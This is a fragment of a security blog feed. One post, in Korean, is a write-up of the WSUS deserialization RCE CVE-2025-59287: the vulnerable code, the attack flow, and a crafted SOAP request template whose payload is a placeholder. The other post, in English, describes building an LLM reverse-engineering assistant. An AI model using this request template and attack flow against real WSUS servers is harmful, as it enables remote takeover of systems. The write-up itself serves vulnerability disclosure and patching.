&#xC5ED;&#xC9C1;&#xB82C;&#xD654;(deserialization)&#xB97C; &#xC218;&#xD589;&#xD560; &#xB54C; &#xBC1C;&#xC0DD;&#xD55C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;(RCE) &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; GetCookie() &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xB85C; &#xC804;&#xC1A1;&#xB41C; AuthorizationCookie &#xAC1D;&#xCCB4;&#xC758; &#xC5ED;&#xC9C1;&#xB82C;&#xD654; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. WSUS&#xC758; <code>Microsoft.UpdateServices.Internal.Authorization.EncryptionHelper.DecryptData()</code> &#xBA54;&#xC11C;&#xB4DC;&#xB294; &#xBCF5;&#xD638;&#xD654;&#xB41C; &#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xCDA9;&#xBD84;&#xD788; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xACE0; <code>BinaryFormatter.Deserialize()</code>&#xB85C; &#xC5ED;&#xC9C1;&#xB82C;&#xD654;&#xD558;&#xC5EC; SYSTEM &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC744; &#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">else</span>{    BinaryFormatter binaryFormatter = <span class="hljs-keyword">new</span> BinaryFormatter();    MemoryStream memoryStream = <span class="hljs-keyword">new</span> MemoryStream(<span class="hljs-built_in">array</span>);    <span class="hljs-keyword">try</span>    {        obj = binaryFormatter.Deserialize(memoryStream); <span class="hljs-comment">// [1]</span>    }    <span class="hljs-keyword">catch</span> (Exception ex2)    <span class="hljs-comment">// ...</span>    <span class="hljs-keyword">if</span> (obj.GetType() != <span class="hljs-keyword">this</span>.classType) <span class="hljs-comment">// [2]</span>    {        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> LoggedArgumentException(<span class="hljs-string">&quot;Decrypted cookie has the wrong data type. Expected type = &quot;</span> + <span class="hljs-keyword">this</span>.classType.ToString() + <span class="hljs-string">&quot;, actual type = &quot;</span> + obj.GetType().ToString(), <span class="hljs-string">&quot;cookieData&quot;</span>);    }}<span class="hljs-keyword">return</span> obj;</code></pre><p>[1] &#xC704; &#xACFC;&#xC815;&#xC740; &#xBCF5;&#xD638;&#xD654;&#xB41C; &#xCFE0;&#xD0A4; &#xBC14;&#xC774;&#xD2B8;(array)&#xB97C; MemoryStream&#xC5D0; &#xB2F4;&#xC544; <code>BinaryFormatter.Deserialize()</code>&#xB85C; &#xC5ED;&#xC9C1;&#xB82C;&#xD654;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC785;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; [2] &#xC774;&#xC5D0; &#xB300;&#xD55C; &#xD0C0;&#xC785; &#xAC80;&#xC0AC;&#xAC00; &#xC5ED;&#xC9C1;&#xB82C;&#xD654; &#xD6C4;&#xC5D0; &#xC77C;&#xC5B4;&#xB0A9;&#xB2C8;&#xB2E4;. &#xC774;&#xC5D0; &#xACF5;&#xACA9;&#xC790;&#xB294; <code>soserial.net</code>&#xACFC; &#xAC19;&#xC740; &#xB3C4;&#xAD6C;&#xB85C; &#xAC00;&#xC82F; &#xCCB4;&#xC778; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4; <code>BinaryFormatter</code>&#xB85C; &#xC5ED;&#xC9C1;&#xB82C;&#xD654;&#xB420; &#xB54C; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; &#xC784;&#xC758;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB3C4;&#xB85D; &#xC720;&#xB3C4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xC545;&#xC6A9;&#xC740; RCE&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Flow"><a href="#Flow" class="headerlink" title="Flow"></a>Flow</h3><p>&#xCDE8;&#xC57D;&#xC810; &#xD750;&#xB984;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>1) &#xC870;&#xC791;&#xB41C; SOAP &#xC694;&#xCCAD; &#xC804;&#xC1A1;</p><p>&#xC778;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xACF5;&#xACA9;&#xC790;&#xAC00; WSUS&#xC758; SOAP&#xC758; &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8; <code>/ClientWebService/Client.asmx</code> &#xB85C; &#xC870;&#xC791;&#xB41C; &#xC694;&#xCCAD;&#xC744; &#xC804;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C; &#xC694;&#xCCAD; &#xD5E4;&#xB354;&#xC5D0;&#xB294; <code>SOAPAction: &#x201C;&#x2026;/GetCookie&quot;</code> &#xB4F1;&#xC774; &#xD3EC;&#xD568;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">POST /ClientWebService/Client.asmx HTTP/<span class="hljs-number">1.1</span>Host: WSUS-SERVER:<span class="hljs-number">8530</span>Content-Type: text/xml; charset=utf<span class="hljs-number">-8</span>SOAPAction: <span class="hljs-string">&quot;http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie&quot;</span>Content-Length: <span class="hljs-number">3632</span>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:soap=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;  &lt;soap:Body&gt;    &lt;GetCookie xmlns=<span class="hljs-string">&quot;http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService&quot;</span>&gt;      &lt;authCookies&gt;        &lt;AuthorizationCookie&gt;          &lt;PlugInId&gt;SimpleTargeting&lt;/PlugInId&gt;          &lt;CookieData&gt;[GENERATED PAYLOAD]&lt;/CookieData&gt;        &lt;/AuthorizationCookie&gt;      &lt;/authCookies&gt;      &lt;oldCookie xsi:nil=<span class="hljs-string">&quot;true&quot;</span> xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>/&gt;      &lt;protocolVersion&gt;1.20&lt;/protocolVersion&gt;    &lt;/GetCookie&gt;  &lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</code></pre><p>2) AuthorizationCookie &#xC548;&#xC5D0; &#xC545;&#xC131; &#xD398;&#xC774;&#xB85C;&#xB4DC; &#xC0BD;&#xC785;</p><p>&#xC694;&#xCCAD;&#xC758; &#xBCF8;&#xBB38;&#xC5D0; <code>AuthorizationCookie</code>&#xC758; <code>CookieData</code> &#xD544;&#xB4DC;&#xC5D0; &#xC545;&#xC131; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xAC00; &#xB4E4;&#xC5B4;&#xAC11;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB294; Base64&#xB85C; &#xC778;&#xCF54;&#xB529;&#xB41C; &#xD6C4; AES-128-CBC&#xB85C; &#xC554;&#xD638;&#xD654;&#xB41C; &#xD615;&#xD0DC;&#xB85C; &#xC804;&#xC1A1;&#xB429;&#xB2C8;&#xB2E4;.</p><p>3) &#xC11C;&#xBC84;&#xC758; &#xC694;&#xCCAD; &#xC218;&#xC2E0; &#x2192; &#xCC98;&#xB9AC;</p><p>&#xD574;&#xB2F9; &#xC694;&#xCCAD;&#xC740; <code>AuthorizationManager.GetCookie</code>&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xACE0;, &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; <code>CrackAuthorizationCookies</code> &#x2192; <code>CrackAuthorizationCookie</code> &#xD638;&#xCD9C; &#xACBD;&#xB85C;&#xB97C; &#xB530;&#xB77C; <code>EncryptionHelper.DecryptData()</code>&#xC5D0; &#xB3C4;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>4) &#xBCF5;&#xD638;&#xD654; &#xB2E8;&#xACC4;</p><p>DecryptData()&#xB294; &#xD558;&#xB4DC;&#xCF54;&#xB529;&#xB41C; AES&#xD0A4;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xBCF5;&#xD638;&#xD654;&#xD569;&#xB2C8;&#xB2E4;.</p><p>5) &#xC5ED;&#xC9C1;&#xB82C;&#xD654;</p><p>&#xBCF5;&#xD638;&#xD654;&#xB41C; &#xBC14;&#xC774;&#xD2B8;&#xB294; <code>MemoryStream</code>&#xC73C;&#xB85C; &#xAC10;&#xC2F8;&#xC838; &#xBC14;&#xB85C; <code>BinaryFormatter.Deserialize()</code>&#xC5D0; &#xC804;&#xB2EC;&#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xC9C0;&#xC810;&#xC5D0;&#xC11C; <code>BinaryFormatter</code>&#xB294; &#xBC14;&#xC774;&#xD2B8; &#xC2A4;&#xD2B8;&#xB9BC;&#xC758; &#xD0C0;&#xC785; &#xC815;&#xBCF4;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xAC1D;&#xCCB4;&#xB97C; &#xBCF5;&#xC6D0;&#xD558;&#xACE0; &#xC0DD;&#xC131;&#xC790;, <code>ISerializable</code> &#xD6C4;&#xD06C;&#xB7;<code>OnDeserialized</code> &#xAC19;&#xC740; &#xCF5C;&#xBC31;&#xC744; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C; &#xC5ED;&#xC9C1;&#xB82C;&#xD654; &#xD6C4;&#xC5D0; obj.GetType()&#xC73C;&#xB85C; &#xD0C0;&#xC785;&#xC744; &#xAC80;&#xC0AC;&#xD558;&#xBBC0;&#xB85C;, &#xC774;&#xBBF8; &#xC77C;&#xC5B4;&#xB09C; &#xC545;&#xC131; &#xB3D9;&#xC791;&#xC744; &#xCC28;&#xB2E8;&#xD558;&#xC9C0; &#xBABB;&#xD569;&#xB2C8;&#xB2E4;.</p><p>6) &#xAC00;&#xC82F; &#xCCB4;&#xC778; &#xC2E4;&#xD589; &#x2192; RCE</p><p>&#xACF5;&#xACA9;&#xC790;&#xC758; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB294; &#xC11C;&#xBC84;&#xC758; &#xAC00;&#xC82F;&#xCCB4;&#xC778;&#xC744; &#xC545;&#xC6A9;&#xD55C;&#xB2E4;&#xBA74;,<br>WSUS &#xD504;&#xB85C;&#xC138;&#xC2A4;(<code>wsusservice.exe</code> &#xB610;&#xB294; <code>w3wp.exe</code>)&#xAC00; SYSTEM &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD558;&#xB294; &#xD658;&#xACBD;&#xC5D0;&#xC11C; RCE&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD604;&#xC7AC; PoC&#xB294; &#xCC3E;&#xC544;&#xBCFC; &#xC218; &#xC788;&#xC9C0;&#xB9CC;, &#xC774; &#xAC8C;&#xC2DC;&#xAE00;&#xC5D0;&#xC11C; &#xB2E4;&#xB8E8;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Fetch"><a href="#Fetch" class="headerlink" title="Fetch"></a>Fetch</h3><p>Microsoft&#xB294; CVE-2025-59287&#xACFC; &#xAD00;&#xB828;&#xD55C; &#xBCF4;&#xC548; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xBC1C;&#xD45C;&#xD588;&#xC73C;&#xB098;, &#xCD08;&#xAE30; &#xD328;&#xCE58;&#xAC00; &#xC644;&#xC804;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xCD94;&#xAC00; &#xAE34;&#xAE09; &#xD328;&#xCE58;&#xAC00; &#xBC30;&#xD3EC;&#xB418;&#xC5C8;&#xACE0; &#xC2E4;&#xC81C; &#xACF5;&#xACA9; &#xC2DC;&#xB3C4;/&#xC545;&#xC6A9;&#xC774; &#xBCF4;&#xACE0;&#xB418;&#xC5B4; &#xC989;&#xC2DC; &#xD328;&#xCE58; &#xC801;&#xC6A9; &#xBC0F; &#xD3EC;&#xD2B8; &#xC644;&#xD654; &#xC870;&#xCE58;&#xAC00; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://socprime.com/blog/cve-2025-59287-detection">https://socprime.com/blog/cve-2025-59287-detection</a></p><p><a href="https://www.picussecurity.com/resource/blog/cve-2025-59287-explained-wsus-unauthenticated-rce-vulnerability">https://www.picussecurity.com/resource/blog/cve-2025-59287-explained-wsus-unauthenticated-rce-vulnerabili</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/bekim/">bekim</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-59287/">CVE-2025-59287</category>
      
      <category domain="https://hackyboiz.github.io/tags/WSUS/">WSUS</category>
      
      <category domain="https://hackyboiz.github.io/tags/Deserialization/">Deserialization</category>
      
      
      <comments>https://hackyboiz.github.io/2025/11/02/bekim/2025-11-20/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Newbie Developer&#39;s Service Development Journey using AI Services Part 1</title>
      <link>https://hackyboiz.github.io/2025/10/30/j0ker/service_dev_part1/en/</link>
      <guid>https://hackyboiz.github.io/2025/10/30/j0ker/service_dev_part1/en/</guid>
      <pubDate>Thu, 30 Oct 2025 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2025/10/30/j0ker/service_dev_part1/en/thumbnail.jpg&quot; alt=&quot;index_img&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;0-What-happened&amp;#x2026;&quot;&gt;&lt;a href=&quot;#0-What-ha</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2025/10/30/j0ker/service_dev_part1/en/thumbnail.jpg" alt="index_img"></p><h1 id="0-What-happened&#x2026;"><a href="#0-What-happened&#x2026;" class="headerlink" title="0. What happened&#x2026;"></a>0. What happened&#x2026;</h1><p>Haha, it&#x2019;s j0ker! Why&#x2019;s it been so long since I last wrote? When was my last post&#x2026; Ah, August&#x2026; Haha&#x2026; Please save me&#x2026; Next time I&#x2019;ll try to write something more interesting&#x2026;</p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/joker.png" alt="image.png"></p><p>Today, unlike my previous research posts, I&#x2019;d like to briefly discuss a project I developed.</p><p>On August 30th, the 31st Hacking Camp took place. About two weeks prior, I suddenly received a call from the organizers&#x2026;</p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/kakao.png" alt="&#x1112;&#x1162;&#x110F;&#x1175;&#x11BC;&#x110F;&#x1162;&#x11B7;&#x1111;&#x1173; &#x1109;&#x1165;&#x11B8;&#x110B;&#x116C;.png"></p><p>Well&#x2026; the original presenter suddenly contacted us saying they couldn&#x2019;t make it, so we had to find a replacement. I was planning to go on the second day, listen to the mentee presentations, and then grab drinks with the organizers in the evening&#x2026; but I ended up giving the presentation lol. So I prepared for it and had about a week to spare&#x2026; but I&#x2019;m a pro at creating work for myself, so I wanted to do something extra.</p><h1 id="1-Planning-Begins"><a href="#1-Planning-Begins" class="headerlink" title="1. Planning Begins"></a>1. Planning Begins</h1><p>To give a quick update, I recently co-founded a startup called L0ch and Hacky-AI, where we&#x2019;re developing security solutions. (If you&#x2019;re interested, please visit our <a href="https://hacky-ai.com/">website</a>!) I believe the most crucial aspect of running a startup is identifying customer problems and proposing solutions. There are plenty of other things to worry about too&#x2026; Anyway, that&#x2019;s why I thought, &#x201C;Why not create something simple that people attending presentations need?&#x201D;</p><p>Since I&#x2019;m also building solutions, I&#x2019;ve become very interested in development using AI services. At this point, the things I wanted to stick to as much as possible were:</p><ol><li>Don&#x2019;t write the code myself; let the AI services write it all.</li><li>We only have a week, so just make it work.</li><li>Build a service people actually need.</li></ol><p>Hacking Camp runs a CTF on the first evening. My assumption was that most participants were just starting out with hacking and probably weren&#x2019;t very familiar with reverse engineering yet! So, wouldn&#x2019;t it be great to develop a reverse engineering assistant tool? I figured I could probably build something like that by investing about three days on my own. (But this was arrogance.) More specifically, I thought I could use an LLM to rename variables and functions to more readable names, and even analyze function contents with an LLM to add comments. (It&#x2019;s been over a year since I last opened IDA, so I realized while building this that such tools already exist as open source&#x2026; haha. Well, the point was for me to try building a service anyway.)</p><p>A simplified service flowchart would look like this:</p><pre><code class="hljs less">&#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;                &#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;                &#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;&#x2502;   <span class="hljs-selector-tag">IDA</span> <span class="hljs-selector-tag">Pro</span>       &#x2502;&#x25C4;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x25BA;&#x2502;   <span class="hljs-selector-tag">FastAPI</span>       &#x2502;&#x25C4;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x25BA;&#x2502;   <span class="hljs-selector-tag">Ollama</span>        &#x2502;&#x2502;   &#xD50C;&#xB7EC;&#xADF8;&#xC778;        &#x2502;                &#x2502;   &#xC11C;&#xBC84;           &#x2502;                &#x2502;   <span class="hljs-selector-tag">LLM</span> &#xC11C;&#xBC84;       &#x2502;&#x2502; (Python)        &#x2502;                &#x2502; (Python)        &#x2502;                &#x2502;                 &#x2502;&#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;                &#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;                &#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;                                            &#x2502;                                   &#x2502;                                            &#x25BC;                                   &#x25BC;                                    &#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;               &#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;                                     &#x2502;   <span class="hljs-selector-tag">Supabase</span>      &#x2502;               &#x2502;   <span class="hljs-selector-tag">Langfuse</span>      &#x2502;                                    &#x2502;   &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;     &#x2502;               &#x2502;   &#xBAA8;&#xB2C8;&#xD130;&#xB9C1;         &#x2502;                                    &#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;               &#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;</code></pre><h1 id="2-Ollama-Server"><a href="#2-Ollama-Server" class="headerlink" title="2. Ollama Server"></a>2. Ollama Server</h1><p>First, you might wonder why I&#x2019;m not using a commercial service. After all, there are so many great models like Gemini and ChatGPT. My personal view is that &#x201C;a small open-source model is sufficient for this service.&#x201D; Before starting this venture, I used open-source models for projects at my previous company. Even now, while conducting research, I&#x2019;ve tested various open-source models to build an on-premises environment. Unfortunately, performance limitations prevent me from testing larger models yet &#x3160;&#x3160;</p><p>The device I currently use at home for LLM inference is a Mac mini. It has an M4 Pro chip and 64GB of RAM. I set up an Ollama server on it and served models. If you visit the <a href="https://ollama.com/search">Ollama homepage</a>, you&#x2019;ll find many models that can be utilized within 64GB of RAM.</p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/01.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-28 &#x110B;&#x1169;&#x1112;&#x116E; 3.55.01.png"></p><p>Among the most popular models like GPT-OSS and DeepSeek, I tend to prefer models around 32B in size that are quantized to Q8. To give a simple reason:</p><ul><li>While 70B Q4 models (about 40G when downloaded) can run on 64GB RAM, these 70B models were already somewhat outdated at the time. I also thought it would be better to use a smaller model, considering the need to reserve space for the context window when processing long functions.</li><li>Around mid-August, some hot new models emerged that were smaller yet performed well. For gpt-oss, there was a 20B MoE model, and qwen3 had 32B and 30B MoE models. These models seemed to deliver performance comparable to the latest ChatGPT 4o or slightly better.</li><li>Beyond these, I also tested smaller models like Phi4 14B and Gemma 27B using several pre-set prompts I had prepared to evaluate their performance.</li></ul><p>After multiple tests, I decided to use the &#x201C;qwen3:30b-a3b-instruct-2507-q8_0&#x201D; model.</p><ol><li><p>As expected, the MoE model is significantly faster at inference than the standard model. The Qwen3 32B q8 model achieved about 7 TPS, while the Qwen 30B MoE model reached up to 45 TPS. I felt this was sufficient for a small-scale service.</p> <pre><code class="hljs yaml"><span class="hljs-attr">total duration:</span>       <span class="hljs-number">54.</span><span class="hljs-string">782917709s</span><span class="hljs-attr">load duration:</span>        <span class="hljs-number">83.</span><span class="hljs-string">491792ms</span><span class="hljs-attr">prompt eval count:</span>    <span class="hljs-number">2649 </span><span class="hljs-string">token(s)</span><span class="hljs-attr">prompt eval duration:</span> <span class="hljs-number">4.</span><span class="hljs-string">376536583s</span><span class="hljs-attr">prompt eval rate:</span>     <span class="hljs-number">605.27</span> <span class="hljs-string">tokens/s</span><span class="hljs-attr">eval count:</span>           <span class="hljs-number">2293 </span><span class="hljs-string">token(s)</span><span class="hljs-attr">eval duration:</span>        <span class="hljs-number">49.</span><span class="hljs-string">986260996s</span><span class="hljs-attr">eval rate:</span>            <span class="hljs-number">45.87</span> <span class="hljs-string">tokens/s</span></code></pre></li><li><p>The reason we did not use the reasoning model qwen3:30b-a3b-thinking-2507 was that a bug where reasoning failed to complete consistently appeared during prompt testing. Since the model had only recently been released at the time, we simply decided not to use it.</p></li><li>The reason for not using other Reasoning models was that they took significantly longer to complete outputs. While the instruct model could produce most outputs within 2 minutes, enabling Reasoning added an extra 1-2 minutes. Additionally, performance was sufficient even without Reasoning.</li><li>Using smaller models required additional work, meaning their single-batch analysis performance was inferior. For the Phi4 14B model, while performance was sufficient, using the FP16 model was necessary to achieve usable performance levels. However, the reasoning time was too long for practical use. Beyond this, we determined that utilizing models like Qwen3 14B, 8B, Gemma 27B, and Deepseek 14B effectively would require significantly more prompt engineering effort.</li><li>Considering various factors like speed, performance, and memory, we determined that using the &#x201C;qwen3:30b-a3b-instruct-2507-q8_0&#x201D; model was the most suitable choice.</li></ol><p>With the model selected, simply set the environment variables and run the server using the <code>ollama serve</code> command&#x2014;that&#x2019;s all it takes to get ready!</p><h1 id="2-Prompt-Logging-with-Langfuse"><a href="#2-Prompt-Logging-with-Langfuse" class="headerlink" title="2. Prompt Logging with Langfuse"></a>2. Prompt Logging with Langfuse</h1><p>You might be thinking, &#x201C;Can&#x2019;t we just use LangSmith?&#x201D; I agree, but&#x2026; since we tested it during the solution development process while considering on-premises deployment, I decided to give Langfuse a try this time.</p><p>Installing Langfuse on the server isn&#x2019;t difficult. Just grab it from the repository and deploy it via Docker. Then, register Langfuse&#x2019;s callback handler in Langchain, and request logging will start as shown below.</p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/02.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 4.22.19.png"></p><p>Logging allows you to verify whether responses to requests were sent correctly and check the quality of those responses. Based on this information, you can refine prompts or execution chains.</p><p>And! You can also detect incoming attacks lol</p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/03.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 4.24.45.png"></p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/04.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 4.24.58.png"></p><p>As shown above, we also detected prompt injection attacks being launched. You worked hard until dawn&#x2026; Unfortunately, it seems you weren&#x2019;t able to obtain the information you wanted.</p><h1 id="3-Lovable-Supabase"><a href="#3-Lovable-Supabase" class="headerlink" title="3. Lovable + Supabase"></a>3. Lovable + Supabase</h1><p>Originally, our website was developed using Base44. Yes, that&#x2019;s the service <a href="https://techcrunch.com/2025/06/18/6-month-old-solo-owned-vibe-coder-base44-sells-to-wix-for-80m-cash/">acquired by Wix for $80M a few months ago</a>. I tried it after reading this article too. It was fine for developing simple landing pages, but problems started piling up after adding login functionality. It was especially terrible when developing features that utilized the database.</p><p>So, while searching for alternatives at the time, I heard that &#x201C;Lovable is a hot service these days&#x201D; and decided to give it a try. I first cloned the webpage I had previously developed exactly as it was, then started developing the login feature. To store user information, I connected it to Supabase. </p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/05.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 5.29.09.png"></p><p>Unlike Base44, it integrates directly with Supabase, makes database management easier, and seems to have many advantages overall. Of course, it might struggle to handle large-scale customers (my wallet, that is). Once you set up this integration and create the login button&#x2026;</p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/06.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 5.36.58.png"></p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/07.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 5.37.39.png"></p><p>Yeah&#x2026; it wasn&#x2019;t exactly easy, but I did manage to succeed after a few tries. After logging in, there should be a dashboard, right? I&#x2019;ll create it by writing the prompt well. </p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/08.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 5.43.31.png"></p><p>Of course, it doesn&#x2019;t get cleanly developed with just that one prompt. If it had worked in one go, I&#x2019;d be out buying Lovable stock right now.</p><p>Anyway, there were still plenty of issues. While it generates API keys randomly just fine, it saves them to Supabase with parts of the key masked (<em>*</em>), or arbitrarily removes buttons, and so on&#x2014;there were a bunch of minor details to worry about. So I decided to narrow the scope of the features to implement. Originally, I wanted to add fun elements like a weekly Top 5 usage list&#x2026; but it required more prompting than expected, so I decided to skip it for now.</p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/09.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 6.55.28.png"></p><p>After about four hours of hard work, I managed to implement all the essential features. If I had developed it myself with my limited web development skills, it would have taken a week. Using AI services these days is definitely more advantageous.</p><p>I&#x2019;ll wrap things up here for today. Next time, 